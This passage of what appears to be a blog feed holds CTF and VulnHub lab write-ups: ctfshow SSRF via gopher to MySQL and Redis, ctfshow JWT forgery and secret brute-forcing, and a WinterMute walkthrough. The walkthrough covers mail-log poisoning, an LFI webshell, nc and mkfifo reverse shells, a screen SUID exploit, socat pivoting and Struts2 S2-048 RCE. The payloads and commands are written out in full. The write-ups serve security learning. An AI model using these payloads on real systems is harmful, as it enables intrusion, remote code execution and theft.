gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%42%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%3d%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%27%3b%01%00%00%00%01</span></span><br></pre></td></tr></table></figure><p>需要手动将<code>gopher://127.0.0.1:3306/_</code>后的内容再进行url编码一次, 我也不知道为什么, 反正编码了之后才能用</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024193221.png" alt="image.png"></p><p>然后用啥玩意执行命令就行, flag在根目录下, payload如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;tac /flag.txt&#x27;);</span><br></pre></td></tr></table></figure><p>然后360基本一样, 将mysql改成redis即可, 也是需要再次URL编码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit redis</span><br><span class="line">PHPShell</span><br><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;</span><br></pre></td></tr></table></figure><p>相关文件:</p><ul><li>[[文件包含]]</li><li>[[Web入门_代码审计]]web359 -&gt; web308</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> SSRF </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 异形URL </tag>
            
            <tag> DNS重定向攻击 </tag>
            
            <tag> gopher伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_jwt</title>
      <link href="/article/ctfshow-webbasic-jwt/"/>
      <url>/article/ctfshow-webbasic-jwt/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Web入门_jwt</h1><hr><h2 id="web345"><a class="header-anchor" href="#web345">¶</a>web345</h2><ul><li>描述: jwt开始啦</li></ul><p>base解码cookie</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;None&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;jwt&quot;</span>&#125;?[&#123;<span class="string">&quot;iss&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;iat&quot;</span>:<span class="number">1729655829</span>,<span class="string">&quot;exp&quot;</span>:<span class="number">1729663029</span>,<span class="string">&quot;nbf&quot;</span>:<span class="number">1729655829</span>,<span class="string">&quot;sub&quot;</span>:<span class="string">&quot;user&quot;</span>,<span class="string">&quot;jti&quot;</span>:<span class="string">&quot;a665ee692b35c52bf4da124b7e06126b&quot;</span>&#125;]</span><br><span class="line"><span class="comment">// 稍作修改</span></span><br><span class="line">&#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;None&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;jwt&quot;</span>&#125;?[&#123;<span class="string">&quot;iss&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;iat&quot;</span>:<span class="number">1729655829</span>,<span class="string">&quot;exp&quot;</span>:<span class="number">1729663029</span>,<span class="string">&quot;nbf&quot;</span>:<span class="number">1729655829</span>,<span class="string">&quot;sub&quot;</span>:<span class="string">&quot;user&quot;</span>,<span class="string">&quot;admin&quot;</span>:<span class="string">&quot;a665ee692b35c52bf4da124b7e06126b&quot;</span>&#125;]</span><br><span class="line"><span class="comment">// eyJhbGciOiJOb25lIiwidHlwIjoiand0In0/W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3Mjk2NTU4MjksImV4cCI6MTcyOTY2MzAyOSwibmJmIjoxNzI5NjU1ODI5LCJzdWIiOiJ1c2VyIiwiYWRtaW4iOiJhNjY1ZWU2OTJiMzVjNTJiZjRkYTEyNGI3ZTA2MTI2YiJ9XQ==</span></span><br></pre></td></tr></table></figure><p>手动写进cookie即可, 这边是直接在控制台的<code>Applocation</code>里面写的, hackerbar设置cookie也是正常的; 听说抓包的话还需要修改header才可以, 不是很懂</p><h2 id="web346"><a class="header-anchor" href="#web346">¶</a>web346</h2><ul><li>描述: 同上</li></ul><p>解密网站: <a href="https://jwt.io/">https://jwt.io/</a></p><p>jwt结构可以从这个网站里面看到: HMACSHA256( base64(头) + <code>.</code> + base(数据), 密钥); 这个网站可以直接在右侧修改字符串, 左侧会同时改变, 修改结果如下:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241023123017.png" alt="image.png"></p><p>你问为什么密钥是这个, 我只能说猜的</p><h2 id="web347"><a class="header-anchor" href="#web347">¶</a>web347</h2><ul><li>描述: jwt开始啦,弱口令</li></ul><p>步骤完全同上, 密码都是一样的</p><p>可能本来的用意是写py脚本跑弱密码字典, 谁知道只是123456呢</p><h2 id="web348"><a class="header-anchor" href="#web348">¶</a>web348</h2><ul><li>描述: jwt开始啦,爆破</li></ul><p>顾名思义, 应该是爆破密钥, 此时再用解密网站一个一个尝试在进度过于缓慢了, 这里我们用万能的py写个脚本, 但是你肯定得用到这个<a href="https://github.com/LandGrey/pydictor">pydictor-字典生成器</a></p><blockquote><p>我寻思上一题没说纯数字, 这一题也没说纯字母啊</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python .\pydictor.py -base L --len 1 4 -o key.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241023194013.png" alt="image.png"></p><p>将这个生成的字典放在下面这个代码的通一个文件夹下, 然后运行这个从官方那里扒拉下来的脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runblasting</span>(<span class="params">path, jwt_str ,alg</span>):</span><br><span class="line">    <span class="keyword">if</span> alg == <span class="string">&quot;none&quot;</span>:</span><br><span class="line">        alg = <span class="string">&quot;HS256&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key = line.strip()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;use &#x27;</span> + key)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key, algorithms=alg)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;find key&#x27;</span> + key)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;found key&#x27;</span> + key)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;key no found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">    runblasting(<span class="string">&#x27;key.txt&#x27;</span>, <span class="string">&#x27;cookie的auth参数&#x27;</span>, <span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后应该能爆出来密码为aaab, 回到之前那个网站改密钥即可</p><h2 id="web349"><a class="header-anchor" href="#web349">¶</a>web349</h2><ul><li>描述: 给了一个app.js文件</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line"><span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>虽然用的是私钥, 但是该文件是可以下载下来的, 所以我们&quot;可能&quot;需要一个题目同款环境, 然后在源码中直接改为admin生成一个jwt即可</p><p>使用py脚本进行操作, 与私钥文件放在同目录下即可, 改cookie我就不写了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;private.key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">payload=&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="string">&#x27;RS256&#x27;</span>))</span><br></pre></td></tr></table></figure><blockquote><p>下面是失败案例, 我不想配环境啊</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx express-generator</span><br><span class="line"><span class="comment"># 似乎有npm就有, 反正你先试试有没有npx, 我是Ubuntu</span></span><br><span class="line"><span class="comment"># 用于快速生成一个基础的 Node.js Web 应用框架</span></span><br></pre></td></tr></table></figure><p>将上面这个<code>app.js</code>的内容复制并替换进你生成的框架的<code>/routes/index.php</code>, 然后改一下user</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241023203458.png" alt="image.png"></p><p>下载私钥, 访问<code>/private.key</code>即可下载, 将其放在你生成的框架目录的public文件夹下</p><p>然后就是安装依赖的时间了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm start</span><br><span class="line"><span class="comment"># 测试, 这里没报错了再进网页看是否报错, 我到这里就没有报错了</span></span><br><span class="line">npm install http-errors</span><br><span class="line">npm install jsonwebtoken</span><br><span class="line"><span class="comment"># 直接输入jwt似乎不行</span></span><br></pre></td></tr></table></figure><p>进入网页出现<code>fs is not defined</code>或者其他的, 是因为没有声明; 在<code>index.js</code>前面加上声明即可:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br></pre></td></tr></table></figure><p>诶您才怎么着, 这些干完了给我整出来一个<code>secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code>, 白瞎了</p><h2 id="web350"><a class="header-anchor" href="#web350">¶</a>web350</h2><ul><li>描述: 给了源码包</li></ul><p>在给的源码中将公私钥都放进了<code>/route</code>目录下, 但是依然可以通过访问<code>/public.key</code>来下载公钥</p><blockquote><p>我这里用python整不出来, 然后配置环境也配不出来, 委屈一下直接运行吧</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// yu22x师傅  </span></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;public.key&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);  </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node jwt.js</span><br><span class="line"><span class="comment"># eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3Mjk3NTYzMzd9.ybFtdAxkeMIln0uDWfoIfwJa-fsP0tAwFmDlX_5pDcE</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024155259.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024155437.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinterMute-1</title>
      <link href="/article/WinterMute-1/"/>
      <url>/article/WinterMute-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>WinterMute: 1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/wintermute-1,239/">vulnhub靶场-WinterMute: 1</a></p><p>目标: The goal is the get root on both machines.</p><p>要求: Your Kali box should ONLY be on the same virtual network as Straylight.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.5</p><p>Straylight: 192.168.56.102</p><p>Neuromancer: 192.168.89</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -A 192.168.56.102</span><br><span class="line"></span><br><span class="line">25/tcp: smtp Postfix smtpd</span><br><span class="line">80/tcp: http Apache httpd 2.4.25 ((Debian))</span><br><span class="line">3000/tcp: Apache Hadoop, 似乎是登录界面</span><br></pre></td></tr></table></figure><p>访问80, 等待图片跳动完毕后弹出来一段对话, 无可用信息; 目录扫描也只是扫描到了<code>/manual</code>目录, 似乎是Apache的详细信息, 也没什么用</p><p>更不要说25端口了, 用来发邮件的</p><p>只能看3000端口, 经过爆破发现是弱密码<code>admin/admin</code>; 进入之后发现是ntop控制面板, 看看有什么有意义的内容</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241126213406.png" alt="image.png"></p><p>发现一些没见过的路径, 甚至还有Redis数据库; 先看看<code>/turing-bolo/</code>路径下有什么</p><p>下拉发现是一个读取文件?的界面, 点击&quot;提交查询&quot;后url变为<code>/turing-bolo/bolo.php?bolo=armitage</code>, 可能存任意文件包含</p><p>如果你提交了case, 可以发现回显界面有三个log, 可以直接从url访问但是没有用, 因为就是其他三个提交项目</p><p>观察url, 发现都没有log后缀, 所以这个地方是限定只能读取.log文件的; 那么还有什么日志可以读取呢, 只能是stmp服务的日志</p><p>搜索<code>Postfix smtpd log location</code>, 可以得到路径<code>/var/log/mail.log</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241126215627.png" alt="image.png"></p><blockquote><p>Postfix log location 也行, 不推荐百度, 实在太烂了</p></blockquote><p>尝试文件包含: <code>/turing-bolo/bolo.php?bolo=../../../../var/log/mail</code>, 可以正常回显</p><p>发现每次访问/发邮件都会被写入日志, 这里就可以写入木马然后包含了</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>我们可以用smtp发邮件, 将发件人或收件人写为木马, 之后在利用LFI漏洞将mail包含到PHP界面, 这样就可以执行木马, 获得shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.56.102 25 </span><br><span class="line"><span class="comment"># 或者 telnet 172.16.2.5 25</span></span><br><span class="line"><span class="comment"># 向服务器标识用户身份</span></span><br><span class="line">HELO Hack</span><br><span class="line"><span class="comment"># 发件人</span></span><br><span class="line">MAIL FROM:<span class="string">&quot;Hack &lt;?=eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line"><span class="comment"># MAIL FROM:&quot;Hack &lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line"><span class="comment"># 收件人</span></span><br><span class="line">RCPT TO:root</span><br><span class="line"><span class="comment"># 开始编辑邮件内容</span></span><br><span class="line">DATA</span><br><span class="line"><span class="comment"># 输入点代表编辑结束</span></span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>然后返回浏览器利用刚才文件包含点进行包含, 需要查看网页源代码才能看到结果</p><blockquote><p>虽然蚁剑在真实渗透中不建议用, 还是用了(因为好看)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进行文件包含</span><br><span class="line">http://192.168.56.102/turing-bolo/bolo.php?bolo=../../../../var/log/mail</span><br><span class="line"># POST:</span><br><span class="line">cmd=system(ls);</span><br></pre></td></tr></table></figure><p>有nc, 利用nc反弹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># POST:</span></span><br><span class="line">cmd=system(<span class="string">&#x27;nc 192.168.56.5 6666 -e /bin/bash&#x27;</span>);</span><br><span class="line"><span class="comment"># 利用py打开新bash</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux straylight 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.9.0-6-amd64</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 网络信息 另一个网卡为192.168.89.4</span></span><br><span class="line">ip addr</span><br><span class="line"><span class="comment"># 查看特权文件 可疑文件/bin/screen-4.5.0</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">gcc -v</span><br><span class="line">socat -h</span><br></pre></td></tr></table></figure><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>直接搜索screen 4.5.0发现存在现成脚本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127124350.png" alt="image.png"></p><p>将这个脚本放在靶机tmp目录下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">python3 -m http.server 6789</span><br><span class="line"></span><br><span class="line"><span class="comment"># 靶机</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.56.5:6789/41154.sh</span><br><span class="line"><span class="built_in">chmod</span> +x 41154.sh</span><br><span class="line">./41154.sh</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127124913.png" alt="image.png"></p><p>第一个flag.txt在<code>/root</code>下, 还有一个note.txt文件, 内容如下</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127131809.png" alt="image.png"></p><p>大概意思是部署了waf?但是这个路径<code>/struts2_2.3.15.1-showcase</code>很像是struts2漏洞; 访问web界面发现并不是外网机器的路径, 那就只能是内网机器的界面了</p><h2 id="横向移动"><a class="header-anchor" href="#横向移动">¶</a>横向移动</h2><p>常年用msf会导致神志不清, 我们来用点别的方法</p><p>靶机没有nmap, 我们可以通过ping进行扫描Neuromancer靶机的IP, 为192.168.89.5</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 255);<span class="keyword">do</span> ping -c 1 192.168.89.<span class="variable">$i</span>;<span class="keyword">done</span> | grep <span class="string">&quot;bytes from&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127130624.png" alt="image.png"></p><p>扫描存活端口, 有8009,8080,34483</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 65535); <span class="keyword">do</span> nc -nvz -w 1 192.168.89.5 <span class="variable">$i</span> 2&gt;&amp;1; <span class="keyword">done</span> | grep -v <span class="string">&quot;Connection refused&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241127131042.png" alt="image.png"></p><p>部分解释</p><ul><li>-v    显示指令执行过程</li><li>-w    &lt;超时秒数&gt; 设置等待连线的时间</li><li>-z     使用0输入/输出模式, 只在扫描通信端口时使用</li></ul><p>利用端口转发使得kali可以访问内网靶机; 使用socat将Straylight中的相同端口转发到 Neuromancer</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 好像说有TCP4</span></span><br><span class="line">socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.89.5:8009 &amp;</span><br><span class="line">socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.89.5:8080 &amp; </span><br><span class="line">socat TCP-LISTEN:34483,fork,reuseaddr TCP:192.168.89.5:34483 &amp;</span><br></pre></td></tr></table></figure><p>此时我们访问Straylight的8080端口就可以访问到Neuromancer的8080端口</p><p>nmap对转发端口进行扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p8009,8080,34483 192.168.56.102</span><br><span class="line"></span><br><span class="line">8009/tcp ajp13 Apache Jserv (Protocol v1.3)</span><br><span class="line">8080/tcp http Apache Tomcat 9.0.0.M26</span><br><span class="line">34483/tcp ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br></pre></td></tr></table></figure><p>访问<code>http://192.168.56.102:8080/struts2_2.3.15.1-showcase</code>, 确实是Struts2, 搜索一下有没有可以利用的exp</p><p>搜索引擎搜搜&quot;Struts2 Showcase 漏洞&quot;, 发现是Apache Struts 2.3.x Showcase 远程命令执行(S2-048)</p><p>搜索kali自带的漏洞库</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit Apache Struts 2.3.x Showcase</span><br><span class="line"><span class="comment"># multiple/webapps/42324.py</span></span><br></pre></td></tr></table></figure><p>是一个反弹shell脚本, 使用方法为后面加上网址和要执行的命令, 注意是内网的ip</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action <span class="string">&quot;nc -nv 192.168.89.4 6666&quot;</span></span><br></pre></td></tr></table></figure><p>你先别急着弹, 如果想让Neuromancer靶机反弹shell到kail上，需要在Straylight靶机继续使用socat做端口重定向到kali</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:6666,fork,reuseaddr TCP:192.168.56.5:6666 &amp;</span><br></pre></td></tr></table></figure><p>执行后弹是弹出来了, 但是因为不支持<code>nc -e</code>功能导致部分shell命令无法使用</p><blockquote><p>你说的对, 我是测试的命令一个没成功, 就是输入没有任何显示</p></blockquote><p>那怎么办, 那就换一个反向shell吧</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f; <span class="built_in">mkfifo</span> /tmp/f; <span class="built_in">cat</span> /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.89.4 7777 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p>简单的解释:</p><ul><li>当命令序列执行时, <code>cat</code>命令会阻塞并等待<code>/tmp/f</code>管道中的数据</li><li><code>nc</code>命令会尝试连接到远程主机, 并等待连接建立</li><li>一旦连接建立, 远程主机可以发送数据到<code>nc</code>; 这些数据会被写入到<code>/tmp/f</code>管道中</li><li><code>cat</code>命令会读取管道中的数据, 并将其作为输入传递给<code>bash</code></li><li><code>bash</code> shell会处理输入, 并生成输出(包括用户输入的命令的结果)</li><li><code>bash</code>的输出(包括标准输出和标准错误)会被重定向回管道, 但由于管道的另一端已经被<code>nc</code>占用, 这些输出实际上会被<code>nc</code>读取, 并通过TCP连接发送回远程主机</li></ul><p>现在利用方法是: 利用S2-048下载并执行文件, 弹shell到kali</p><p>在kali新建一个hello.sh文件, 将刚才那个反向shell塞进去, 然后开启http服务</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202200029.png" alt="image.png"></p><blockquote><p>如果你用了其他端口, 重新用socat建一个管道</p></blockquote><p>然后让内网主机下载运行这个文件(运行脚本均在kali)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action <span class="string">&quot;wget http://192.168.89.4:6666/hello.sh -O /tmp/hello.sh&quot;</span></span><br><span class="line"><span class="comment"># 赋权</span></span><br><span class="line">python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action <span class="string">&quot;chmod +x /tmp/hello.sh&quot;</span></span><br></pre></td></tr></table></figure><p>我这里.sh文件写的是7777端口, 要用socat建一个新的管道</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:7777,fork,reuseaddr TCP:192.168.56.5:7777 &amp;</span><br></pre></td></tr></table></figure><p>然后kali监听, 内网主机运行(端口打结导致试了好久):</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">nc -lvnp 7777</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让target运行</span></span><br><span class="line">python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action <span class="string">&quot;sh /tmp/hello.sh&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241202202003.png" alt="image.png"></p><h2 id="信息收集-v3"><a class="header-anchor" href="#信息收集-v3">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span 